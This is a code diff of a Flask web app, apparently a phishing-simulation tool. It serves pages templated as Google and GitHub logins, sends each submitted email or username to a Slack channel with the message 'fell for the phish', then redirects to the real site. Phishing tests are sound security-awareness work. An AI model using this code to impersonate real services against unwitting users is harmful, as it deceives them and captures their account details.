@@ -11,10 +11,19 @@ client = slack.WebClient(SLACK_API_TOKEN)
 
 @app.route('/')
 def index():
-    return render_template('login.html', title='Home')
+    return render_template('google.html', title='Home')
 
-@app.route('/handle_data', methods=['POST'])
-def handle_data():
-    client.chat_postMessage(channel=SLACK_USER, text=request.form['Email'] + " fell for  the phish.")
+@app.route('/login')
+def login():
+    return render_template('github.html', title='Home')
+
+@app.route('/google', methods=['POST'])
+def google():
+    client.chat_postMessage(channel=SLACK_USER, text=request.form['Email'] + " fell for the phish.")
     return redirect("https://calendar.google.com", code=302)
+
+@app.route('/github', methods=['POST'])
+def github():
+    client.chat_postMessage(channel=SLACK_USER, text=request.form['login'] + " fell for the phish.")
+    return redirect("https://github.com", code=302)
 
